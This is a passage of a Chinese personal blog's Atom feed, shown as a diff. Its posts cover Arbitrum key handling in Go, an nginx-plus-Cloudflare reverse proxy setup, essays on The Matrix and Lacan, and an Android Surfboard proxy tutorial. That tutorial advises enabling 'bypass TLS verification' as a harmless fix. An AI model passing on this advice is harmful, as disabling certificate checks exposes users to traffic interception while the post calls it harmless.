`koanf:&quot;only-create-key&quot;`&#125;</code></pre><p>继续点到OpenWallet可以看到他是如何处理这些配置项的</p><p>在有私钥的情况下最终会走到这个方法</p><pre><code class="go">func NewKeyedTransactorWithChainID(key *ecdsa.PrivateKey, chainID *big.Int) (*TransactOpts, error) &#123;    keyAddr := crypto.PubkeyToAddress(key.PublicKey)    if chainID == nil &#123;        return nil, ErrNoChainID    &#125;    signer := types.LatestSignerForChainID(chainID)    return &amp;TransactOpts&#123;        From: keyAddr,        Signer: func(address common.Address, tx *types.Transaction) (*types.Transaction, error) &#123;  // signer就是我们一直再找的在发送交易时使用到的签名方法            if address != keyAddr &#123;                return nil, ErrNotAuthorized            &#125;            signature, err := crypto.Sign(signer.Hash(tx).Bytes(), key)            if err != nil &#123;                return nil, err            &#125;            return tx.WithSignature(signer, signature)        &#125;,        Context: context.Background(),    &#125;, nil&#125;</code></pre><p>从这里看出来，私钥始终保存在signer这个方法中，在整个使用过程中没有将私钥作为参数传递的情况。</p><p>如果使用的是filekey+密码的情况会进入到这个方法</p><pre><code class="go">func NewKeyStoreTransactorWithChainID(keystore *keystore.KeyStore, account accounts.Account, chainID *big.Int) (*TransactOpts, error) &#123;    if chainID == nil &#123;        return nil, ErrNoChainID    &#125;    signer := types.LatestSignerForChainID(chainID)    return &amp;TransactOpts&#123;        From: account.Address,        Signer: func(address common.Address, tx *types.Transaction) (*types.Transaction, error) &#123;            if address != account.Address &#123;                return nil, ErrNotAuthorized            &#125;            signature, err := keystore.SignHash(account, signer.Hash(tx).Bytes())            if err != nil &#123;                return nil, err            &#125;            return tx.WithSignature(signer, signature)        &#125;,        Context: context.Background(),    &#125;, nil&#125;</code></pre><p>程序会根据filekey构造一个keystore,后续签名都是在keystore中签名</p><p>注意filekey的密码是在终端控制台输入的,其中的readPass函数如下</p><pre><code class="go">func readPass() (string, error) &#123;    bytePassword, err := term.ReadPassword(syscall.Stdin)    if err != nil &#123;        return &quot;&quot;, err    &#125;    passphrase := string(bytePassword)    passphrase = strings.TrimSpace(passphrase)    return passphrase, nil&#125;</code></pre>]]></content>
+    
+    
+    <summary type="html">这篇文章探讨了区块链应用中密钥管理的重要性，特别是在持续向区块链发送交易的场景下，如Arbitrum的Sequencer和Chainlink的数据馈送，强调了安全使用和管理私钥的方法，包括通过配置文件和文件密钥，同时分析了密钥的安全等级以及如何在程序中有效保护密钥，最后以Arbitrum的具体实现为例，详细阐述了密钥的生成、使用和存储过程。</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="以太坊" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
+    
+    
+    <category term="区块链" scheme="https://bighu630.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="arbitrum" scheme="https://bighu630.github.io/tags/arbitrum/"/>
+    
+    <category term="密钥管理" scheme="https://bighu630.github.io/tags/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>nginx一个端口服务多个网页（带cdn)</title>
+    <link href="https://bighu630.github.io/2024/09/06/nginx-cf%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%A4%9A%E4%B8%AA%E7%BD%91%E9%A1%B5/"/>
+    <id>https://bighu630.github.io/2024/09/06/nginx-cf%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%A4%9A%E4%B8%AA%E7%BD%91%E9%A1%B5/</id>
+    <published>2024-09-06T07:48:05.000Z</published>
+    <updated>2024-09-23T11:34:16.270Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>这篇博客介绍了如何使用Cloudflare和Nginx，在同一服务器的443端口上托管多个服务。通过为不同子域名配置Nginx反向代理，将请求路由到不同的本地服务，并使用Cloudflare的SSL证书和CDN加速访问。</p></blockquote><h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>大学的时候买了一个阿里云的小鸡，一直续费在现在，上面跑了不少服务（trilium note,worldpress,calibre），但是服务器的网速非常低。</p><p>最近听说cdn的加速功能，先尝尝能不能给我的服务器提点速。</p><p>**如果不喜欢听故事 直接跳转到 <code>nginx反向代理多个域名</code> **</p><h2 id="在此之前我的配置"><a href="#在此之前我的配置" class="headerlink" title="在此之前我的配置"></a>在此之前我的配置</h2><p>很早的时候我还不会给网站加https,我的服务在公网上以http跑了两年多，后面是在忍不了，给服务器买了个域名（以前一直没域名，用ip访问😀）<br>然后开启了我的https配置之旅.</p><p>其中最恶心的是worldpress。我的worldpress是用docker搭建的，worldpress的ssl实现是用apatch做的，它在docker里面跑了一个apatch，我去容器里面给他配了一个apatch🤮</p><p>有了域名之后，我的三个服务以不同的端口跑在我的服务器上，访问的时候都是带着端口访问的（当然我是认为没什么问题，就是不那么好看）</p><h2 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h2><p>两个月前其实就尝试过给网站套cf的cdn,但是一直没成功（因为我用的不是443端口），无论我怎么尝试，套了cdn之后就一直是http能访问，https访问的时候会之际把我的端口抹除，没有s我怎么忍得了，所以第一次尝试失败了</p><h2 id="nginx反向代理多个域名"><a href="#nginx反向代理多个域名" class="headerlink" title="nginx反向代理多个域名"></a>nginx反向代理多个域名</h2><p>为了使我的三个服务都用443端口，然后在用cdn对443端口进行加速</p><h3 id="把域名交给cf托管"><a href="#把域名交给cf托管" class="headerlink" title="把域名交给cf托管"></a>把域名交给cf托管</h3><p>这里我就不教cf怎么托管域名，网上都有<br>托管了之后，我们可以在cf里面添加域名解析<br>那么我分别为我的三个域名申请了3个域名</p><ul><li>blog.domain.com</li><li>note.domain.com</li><li>lib.domain.com</li></ul><p>这三个域名解析的地址都是我服务器的地址</p><blockquote><p>以上只是举例</p></blockquote><p><img src="https://pic.imgdb.cn/item/66dab88cd9c307b7e91ddcb9.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66dab88cd9c307b7e91ddcb9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="cf"></p><p>注意点亮右边的小彩云（表示开启cf的cdn加速)</p><h3 id="写nginx的配置文件"><a href="#写nginx的配置文件" class="headerlink" title="写nginx的配置文件"></a>写nginx的配置文件</h3><p>nginx怎么运做的我这里就不介绍了（不会的可以搜索一下nginx的配置文件怎么写，写好了放那儿，怎么开启nginx,怎么重载nginx的配置文件）</p><p>这里给出gpt给我的配置文件</p><pre><code class="c"># 第一个网站的配置，代理到 localhost:3001  # 假设我的3001是图书馆的服务地址server &#123;    listen 443 ssl;    server_name lib.domain.com; # 图书观的域名    # SSL 证书    ssl_certificate /etc/nginx/ssl/example1.com.crt;    ssl_certificate_key /etc/nginx/ssl/example1.com.key;    location / &#123;        proxy_pass http://localhost:3001;  # 代理到本地的 3001 端口        proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_set_header X-Forwarded-Proto $scheme;    &#125;&#125;# 第二个网站的配置，代理到 localhost:3002   # 假设是我的博客server &#123;    listen 443 ssl;    server_name blog.domain.com;    # SSL 证书    ssl_certificate /etc/nginx/ssl/example2.com.crt;    ssl_certificate_key /etc/nginx/ssl/example2.com.key;    location / &#123;        proxy_pass http://localhost:3002;  # 代理到本地的 3002 端口        proxy_set_header Host $host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_set_header X-Forwarded-Proto $scheme;    &#125;&#125;</code></pre><p><strong>关于上面的配置</strong><br>正常情况没有多少要修改的</p><ul><li><p>server_name: 这里写你在cf上申请的域名</p></li><li><p>ssl_certificate: 证书的路径,一般情况你需要去购买证书，但是使用cf做cdn 你可以使用cf中的证书（也可以自己生成证书，只需要把cf里面的ssl安全等级开到完全如下图）<br><img src="https://pic.imgdb.cn/item/66dabaafd9c307b7e9234c74.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66dabaafd9c307b7e9234c74.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ssl"></p><ul><li><p>使用cf中的证书: 在这个页面为你的域名申请证书(如果不懂就老老实实用<code>完全模式</code> 或者自己买证书)</p><p><img src="https://pic.imgdb.cn/item/66dabaf8d9c307b7e923a372.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66dabaf8d9c307b7e923a372.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="服务器证书"></p></li></ul></li><li><p>proxy_pass: 这里填我们真正服务的地址</p></li></ul><p>这时我们访问<code>lib.domain.com</code> 就会被nginx路由到 <code>http://localhost:3001</code> 上</p><p>访问 <code>blog.domain.com</code> 就会被nginx路由到 <code>http://localhost:3002</code> 上</p><h2 id="缘散"><a href="#缘散" class="headerlink" title="缘散"></a>缘散</h2><p>至此，在同一个服务器的443端口开启了多个网页，但是在访问的时候我们用的是不同的域名</p>]]></content>
+    
+    
+    <summary type="html">这篇博客介绍了如何使用Cloudflare和Nginx，在同一服务器的443端口上托管多个服务。通过为不同子域名配置Nginx反向代理，将请求路由到不同的本地服务，并使用Cloudflare的SSL证书和CDN加速访问。</summary>
+    
+    
+    
+    <category term="计算机" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
+    
+    <category term="运维" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%BF%90%E7%BB%B4/"/>
+    
+    
+    <category term="cloudflare" scheme="https://bighu630.github.io/tags/cloudflare/"/>
+    
+    <category term="nginx" scheme="https://bighu630.github.io/tags/nginx/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>黑客帝国中的形而上学</title>
+    <link href="https://bighu630.github.io/2024/09/03/%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD%E4%B8%AD%E7%9A%84%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/"/>
+    <id>https://bighu630.github.io/2024/09/03/%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD%E4%B8%AD%E7%9A%84%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/</id>
+    <published>2024-09-03T12:27:00.000Z</published>
+    <updated>2024-09-23T11:34:16.273Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>这篇文章深入探讨了《黑客帝国》中的哲学核心，特别是通过对主要角色Neo、先知和老先生的分析，揭示了电影中的复杂世界观。文章探讨了Neo作为“程序中的变数”，如何象征着自由意志在一个被控制的系统中的存在与挣扎。同时，文章通过形而上学的视角，探讨了先知对未来的预知与个体自由意志之间的矛盾，进一步引发了对自我认知和现实层次的思考。这是一篇关于《黑客帝国》哲学内核的深度解读，探索了自由意志、宿命论以及个体在系统中的定位。</p></blockquote><p>首先，黑客帝国不可否认是一部优秀的电影，不只是他的精神内核,他的艺术表现形式也是值得称赞的。</p><p>本期我将着重于黑客帝国的精神内核来履清黑客帝国究竟是讲的什么。</p><h2 id="我将会怎么解读？"><a href="#我将会怎么解读？" class="headerlink" title="我将会怎么解读？"></a>我将会怎么解读？</h2><p>这是黑客帝国中很有意思的一个问题（男主问先知：我将会问你什么？）</p><p>那么这个问题的答案是：黑客帝国中的两个（或者三个）关键人物。neo，先知，和创建矩阵的老先生。并且关键不是他们的目的，动机。而是：他是谁（什么）。</p><p>那么，我们首先来看一些第二季的最后，neo打开了那扇关键的门，在门里面遇到了世界的创建者。neo问到：我是谁。这时老先生给出了世界观的关键信息。</p><h2 id="neo是谁？"><a href="#neo是谁？" class="headerlink" title="neo是谁？"></a>neo是谁？</h2><p>老先生说：你是我创造出来的一系列问题（一系列bug），我不知道你是谁，但你来到这里，我就知道你是那一系列bug的组合。</p><p>正常而言 先知会解决你（解决这个bug），但是你能找到这儿来说明先知没有解决你。</p><p>接着老先生又说在最开始的几个版本中，本来没有你（指bug），但是没有你（各种意外）的世界，活不到现代，后面他在矩阵中创建了意外，而先知则会修复意外，使得“现实”不至于分崩离析.先知会告诉你一切（除非你是你，亦或者你是先知的意外）</p><p>由上面的话，我们带入一点程序的思路（这是这个故事有意思的地方，包括第二部里面neo和黑衣人打群架，其实neo大概率不会累，他在里面只是一个程序）。老先生创建了这个世界，为了让世界得以存活，所以为这世界保留了“意外”，也就是程序中存在一定的随机量，但是他创建了先知，来修复这个随机量。即对于程序执行，存在一定几率不合逻辑，但是如果你问先知，他说的一定会发生。那么首先我们思考一下没有意外的世界是什么样的，用极限来讲，你可以随时随地问先知，那么你实际上什么都不会做，你只会问先知，这是世界自然不会发展。而存在意外量的情况则是，你依然保留你的随即数，但当你问先知，那么答案就一定是确定的（先知是个老人，回答不了太多人，也就是有访问限制）。那么这就有一个很有意思的问题。 在矩阵中自由意识存在吗？</p><h2 id="什么是自由意识？"><a href="#什么是自由意识？" class="headerlink" title="什么是自由意识？"></a>什么是自由意识？</h2><p>在存在先知的世界中，自由意识存在吗？在先知眼里，自由意识不存在，因为无论是什么问题，只要你问先知，他的回答就是包含你以为的自由意志作用之后的答案。比如，你问今晚12点之前我可以睡着吗，那么先知的回答这是包含了在你听到答案之后自由意志作祟但是依然无法改变的结果，那么对于先知而言自由意志只是一个他意料之中的参数。</p><p>那么对于个人而言，他存在自由意志吗。他存在，因为在问先知之前，他的未来是不确定的，那么就有一有点吊诡的问题。（有人害怕知道自己的未来会导致没有希望，但又渴望知道未来，所以他问先知，我要问我的未来吗，而当你去问的时候，你的未来已经被先知确认了，他已经知道你会在什么时候问，而你的生活依然是无限可能性，进一步说，先知早已知道你会来问他这个问题）。<br>这就是先知的作用，磨平随即量，但你的未来依然由你决定（而贸然问先知你会怎么样，往往不会有好结果，只有你义无反顾的时候，你坚信先知的话不会影响你，才可能会有好结果）</p><p>那么既然说到了先知，我们就好好谈一下这篇文章的另一主题，形而上学。</p><h2 id="什么是形而上学？"><a href="#什么是形而上学？" class="headerlink" title="什么是形而上学？"></a>什么是形而上学？</h2><p>有这么一个故事：有一个叫凯恩的人，他在一个咖啡馆里喝咖啡，真在他欣赏咖啡杯的时候，瞥见了对面新开的一间图书馆，然后他起身，打算去图书馆逛逛，他在书柜间闲逛时，看到了一半叫 凯恩录 的书，他打开看，里面从一个孩子出生开始，到被起名字，书的内容有一个奇怪的特点，所有的事情都是用现在进行时写的，随后他翻倒小学的故事，猛的震惊了他，所有的事都是他小学发生的，然后他继续看，看到他在咖啡馆，他到图书馆，他看到了这本书，他震惊。然后他接着往下看，看到38岁的时候，书上只剩最后一页了，他死在飞机上（最后即使万般小心，但书上说的事情都发生了）。</p><p>而在黑客帝国中，先知就是所有人的书。关于形而上学，有一个有意思的问题。矩阵中的人是被先知控制的吗。这是很有意思的，因为答案不是。形而上学并不控制人，如凯恩录 里面，一切都是现在进行时，先知只是知道会发生什么，但并不起决定作用，这么说，先知看透了你，他知道你这个程序，在矩阵这个环境中接下来会发生什么，形而上学也同样不控制你，但是你的结果依然是确定的，也就是自由意志存在（你还是你），但没用。</p><h2 id="你（我）是谁？"><a href="#你（我）是谁？" class="headerlink" title="你（我）是谁？"></a>你（我）是谁？</h2><p>为什么你还是你，但是没用。因为你不知道你是谁，跟具体而言，你认为你是个“什么”,以至于蒙蔽了你，使得你以为你知道你是谁，实际上你不知道.<br>我们还是请出先知来看看这个问题。你是谁？<br>本质上先知有两个答案（你有自我意识，你没有自我意识），如果你没有自我意识，那么你就是矩阵，你是这里面的一个程序，那么这个问题就是。就程序而言你是什么？那答案就是你在这个程序里面是什么.（所以自我意识似乎是一种天赋,一种你在程序里而自知在程序里的天赋.这似乎不可能，就好像鱼儿不知道有空气一样的，纯粹在程序之中的人不知道程序，黑客帝国里面还是保留着 希安这一概念，男主是被唤醒的）。<br>简单而言，先知会说你是个工人，是个学生，是谁的男朋友，是会的女朋友，是谁的儿子，是谁的父亲，但这一切，在本质上说，你是矩阵的一部分。</p><p>那么另外一种情况也就是你是救世主，关于救世主是什么，其实救世主是（不是矩阵，也就是什么都不是）。</p><p>有一个有意思的点在于 希安的人虽然不再矩阵里，但她们也不是救世主，因为他们是 希安。</p><p>另外，在第一季中，男主问先知：我是救世主吗？ 先知说不是。</p><p>如果不钻设计的空子，无论谁问先知是不是救世主，先知只能说不是，因为救世主不再先知的理解范围（先知的边界是矩阵），所以先知这时候就像是那条水里的鱼，不知道救世主是什么。</p><h3 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h3><p>[预告： 老先生是什么吗，我们知道老先生是矩阵的上层，但是，老先生不一定就是最上层（这是缸中之脑的故事，以及有另外一个小说 –《13层空间》是讲述关于现实的上层）]</p>]]></content>
+    
+    
+    <summary type="html">这篇文章深入探讨了《黑客帝国》中的哲学核心，特别是通过对主要角色Neo、先知和老先生的分析，揭示了电影中的复杂世界观。文章探讨了Neo作为“程序中的变数”，如何象征着自由意志在一个被控制的系统中的存在与挣扎。同时，文章通过形而上学的视角，探讨了先知对未来的预知与个体自由意志之间的矛盾，进一步引发了对自我认知和现实层次的思考。这是一篇关于《黑客帝国》哲学内核的深度解读，探索了自由意志、宿命论以及个体在系统中的定位。</summary>
+    
+    
+    
+    <category term="哲学" scheme="https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/"/>
+    
+    <category term="形而上学" scheme="https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/"/>
+    
+    
+    <category term="形而上学" scheme="https://bighu630.github.io/tags/%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/"/>
+    
+    <category term="黑客帝国" scheme="https://bighu630.github.io/tags/%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>拉康精神分析与伦理</title>
+    <link href="https://bighu630.github.io/2024/09/02/%E6%8B%89%E5%BA%B7%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BC%A6%E7%90%86/"/>
+    <id>https://bighu630.github.io/2024/09/02/%E6%8B%89%E5%BA%B7%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BC%A6%E7%90%86/</id>
+    <published>2024-09-02T12:12:16.000Z</published>
+    <updated>2024-09-23T11:34:16.272Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>文章探讨了拉康精神分析中的两个核心概念——自我与大他者的关系。自我在与大他者的分离和互动中逐渐显现，但这种显现也是一种消失。最初，大他者多表现为母亲，自我与其处于融合状态，随后随着父亲的出现，孩子意识到大他者的分离性，进而认识到自我与大他者的独立性。然而，这种独立感只是暂时的，最终自我会被更大的社会大他者所替代。文章还探讨了不同状态下自我与他者的关系，包括完全依赖他者、与他者分离、以及半分离状态，并暗示每个人都处在某种程度的精神病态中。</p></blockquote><p>缘起于我在b站上看的这么一个视频 <a href="https://www.bilibili.com/video/BV1zF4m1u7xH">https://www.bilibili.com/video/BV1zF4m1u7xH</a></p><p>视频我大体能理解，不过需要记一下，看看我理解了多少</p><p>在拉康的精神分析中，有两个重要的角色。</p><ul><li><p>自我</p></li><li><p>大他者</p><p>注意这里的自我并不是具体的自我，是一种抽象的自我，这个自我在与大他者的分离中才逐步显现出来。但的一显现实际上是一种消失（我的理解）。自我的起源在于对大他者的反抗，在这个过程中，人自然而然的认为存在一个自我（这是反抗的源头），而后意识到自我与这个大他者的交融关系（这两是同时的）。随后展开自我与大他者的拉锯战</p></li></ul><p>首先需要明白一点，这个大他者在开始时是母亲。在孩童时代自我与母亲是一种绝对的融合关系，我们对母亲的反抗不是拒绝，而是抱头大哭。可以这样想象，一个孩子犯错了（比如尿床了，有时候母亲会脾气不好），母亲如果打孩子，孩子不会跑，他会往母亲那里靠。这个时候孩子有自我吗。有，越打他越靠。这个时候表现为自我与大他者的同一。注意这里的大他者几乎都是母亲。随着年龄的不断增长，父亲这个角色逐渐浮现到孩子的视野里面（值得注意的是，及时父亲一直陪伴这孩子的成长，孩子也不会马上意识到父亲的存在，实际上更多时候父亲只是个npc），当孩子意识到父亲的存在是（一般是父亲，因为父亲是一个主线npc,其他人暂时还只是支线npc）从而意识到大他者的不完整性，（大他者的分离），从而逐渐意识到自我与大他者的分离，进一步到反抗大他者。从而进入到一种（父亲崇拜的年龄中）在这个过程中，那个他者之下的自我崇拜父亲这种（独立）的自我，当然这一崇拜并没有让自我意识到自我，而是让自我意识到他者的可分离</p><p>更进一步自我在崇拜中醒悟（这一醒悟来自于社会），这一醒悟让自我意识到自我，即自我与大他者的可分离，（这里插一嘴，似乎我已经忘了最初的自我是什么了）。当然这一可分离是一种误解，实际上是对社会环境这一更大的他者所替代，但这一幻觉对之后的分离有关键作用。自我在社会这个抽象的大他者中，而自以为是自我，这一他者的蒙蔽性在与，他不存在具体的某个人，自我就像是在空气中一样。</p><p>说完自我与他者，我们来看看精神分析如何看待自我他者问题。</p><p>首先有一个很有意思的结论：每个人都是精神病，无论你处在 自我与他者 的什么关系中。</p><h2 id="自我在他者之中"><a href="#自我在他者之中" class="headerlink" title="自我在他者之中"></a>自我在他者之中</h2><p>自我在他者之中从上面的分析可以看出这是一种这是一种婴儿的表现（或者巨婴），在这种情况中，自我全然依赖他者，而这种依赖不是说让做什么就做什么，而是那种说往东走，就一直走，雷打不动。</p><h2 id="自我与他者的分离"><a href="#自我与他者的分离" class="headerlink" title="自我与他者的分离"></a>自我与他者的分离</h2><p>可以想象一下这样一种情况，你不在乎家人对你的要求，你不在乎社会对你的要求（你是自我，而不依靠他者）。你会迷茫，你会以为你想要的不过是你对他者的依赖，你会拒绝这种依赖，像马尔库塞的大拒绝那样拒绝他者。在这你只能拒绝，像一个悲剧英雄一样，但你拒绝悲剧英雄。他者无时无刻的入侵。你想反抗。</p><h2 id="自我与他者的半分离状态"><a href="#自我与他者的半分离状态" class="headerlink" title="自我与他者的半分离状态"></a>自我与他者的半分离状态</h2><p>这里的自我，渴望与他者的分离，想要找到分离的路线，试图去制造分离。典型的就是sm.试图生产出与他者分离的自我来找到分离的路径</p><p>伦理：</p><p>未完待续</p>]]></content>
+    
+    
+    <summary type="html">文章探讨了拉康精神分析中的两个核心概念——自我与大他者的关系。自我在与大他者的分离和互动中逐渐显现，但这种显现也是一种消失。最初，大他者多表现为母亲，自我与其处于融合状态，随后随着父亲的出现，孩子意识到大他者的分离性，进而认识到自我与大他者的独立性。然而，这种独立感只是暂时的，最终自我会被更大的社会大他者所替代。文章还探讨了不同状态下自我与他者的关系，包括完全依赖他者、与他者分离、以及半分离状态，并暗示每个人都处在某种程度的精神病态中。</summary>
+    
+    
+    
+    <category term="哲学" scheme="https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/"/>
+    
+    <category term="心理学" scheme="https://bighu630.github.io/categories/%E5%93%B2%E5%AD%A6/%E5%BF%83%E7%90%86%E5%AD%A6/"/>
+    
+    
+    <category term="拉康" scheme="https://bighu630.github.io/tags/%E6%8B%89%E5%BA%B7/"/>
+    
+    <category term="精神分析" scheme="https://bighu630.github.io/tags/%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90/"/>
+    
+    <category term="伦理" scheme="https://bighu630.github.io/tags/%E4%BC%A6%E7%90%86/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>安卓Surfboard使用教程</title>
+    <link href="https://bighu630.github.io/2024/09/02/%E5%AE%89%E5%8D%93Surfboard%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
+    <id>https://bighu630.github.io/2024/09/02/%E5%AE%89%E5%8D%93Surfboard%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
+    <published>2024-09-02T11:50:20.000Z</published>
+    <updated>2024-09-23T11:34:16.272Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>本文提供了在安卓设备上使用 Surfboard 的简单教程，涵盖了从安装、添加连接&#x2F;订阅到启动和测试的步骤。指南还包括如何使用分流功能让特定应用通过 VPN，以及修复连接问题的解决方法，如启用“绕过 TLS 验证”选项。该教程旨在帮助用户轻松解决安卓设备上的大部分问题。</p></blockquote><p><strong>由于很多小伙伴不知道安卓上Surfboard的使用，这里出一篇教程，旨在用最简单的步骤解决安卓机上的大部分问题</strong></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装建议去google Play上安装</p><p><img src="https://pic.imgdb.cn/item/66da71d7d9c307b7e9c24a3f.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da71d7d9c307b7e9c24a3f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>长这个样子</p><h2 id="添加连接-订阅"><a href="#添加连接-订阅" class="headerlink" title="添加连接&#x2F;订阅"></a>添加连接&#x2F;订阅</h2><p>一般情况下你会拿到节点的连接或者订阅：（像是一个网址之类的）</p><img src="https://pic.imgdb.cn/item/66da7279d9c307b7e9c442f0.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da7279d9c307b7e9c442f0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom: 67%;" /><p>在配置这个选项卡里面，点击右下角的加号，选择最下面这个（从url导入）</p><p>贴入上面的url，点击导入就可以</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>在仪表盘页面，点击右下角的启动图标就可以（强烈建议出站模式选规则，可以避免国内网站也走翻墙服务）</p><img src="https://pic.imgdb.cn/item/66da7293d9c307b7e9c49917.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da7293d9c307b7e9c49917.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:67%;" /><h2 id="测试（看是否可用）"><a href="#测试（看是否可用）" class="headerlink" title="测试（看是否可用）"></a>测试（看是否可用）</h2><p>点到“代理” 选项卡里面，点右下角的测速图标就可以看是否连接成功</p><p>如果测速显示失败：</p><p>方法1：多测试几次（一般2-3次）因为刚连上可能会不稳定</p><p>方法2：去仪表板重启一下（点两下左下角的启动图标）然后重复方法1</p><h2 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h2><p>在工具中选择分流设置，仅让需要翻墙的软件使用vpn</p><p><img src="https://pic.imgdb.cn/item/66da72add9c307b7e9c4ea8f.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da72add9c307b7e9c4ea8f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:67%;display: inline-block;"/><img src="https://pic.imgdb.cn/item/66da72c2d9c307b7e9c5137a.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da72c2d9c307b7e9c5137a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:67%;display: inline-block;" /></p><h2 id="问题修复"><a href="#问题修复" class="headerlink" title="问题修复"></a>问题修复</h2><p>如果一直测试不可用，建议进行如下操作（没什么影响，可用的也可以这么操作一下）</p><p>1：点右上角的三个点进入设置页面</p><p>2：点击覆盖选项</p><p>3：开启“绕过tls验证”</p><p><img src="https://pic.imgdb.cn/item/66da72d4d9c307b7e9c52461.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da72d4d9c307b7e9c52461.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:67%;display: inline-block;" /><img src="https://pic.imgdb.cn/item/66da72e6d9c307b7e9c60b1b.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da72e6d9c307b7e9c60b1b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:67%;display: inline-block;" /><img src="https://pic.imgdb.cn/item/66da7302d9c307b7e9c668e6.png" class="lazyload" data-srcset="https://pic.imgdb.cn/item/66da7302d9c307b7e9c668e6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:67%;display: inline-block;" /></p>]]></content>
+    
+    
+    <summary type="html">本文提供了在安卓设备上使用 Surfboard 的简单教程，涵盖了从安装、添加连接/订阅到启动和测试的步骤。指南还包括如何使用分流功能让特定应用通过 VPN，以及修复连接问题的解决方法，如启用“绕过 TLS 验证”选项。该教程旨在帮助用户轻松解决安卓设备上的大部分问题。</summary>
+    
+    
+    
+    <category term="教程" scheme="https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    <category term="科学上网" scheme="https://bighu630.github.io/categories/%E6%95%99%E7%A8%8B/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
+    
+    
+    <category term="教程" scheme="https://bighu630.github.io/tags/%E6%95%99%E7%A8%8B/"/>
+    
+    <category term="科学上网" scheme="https://bighu630.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MPT系列1</title>
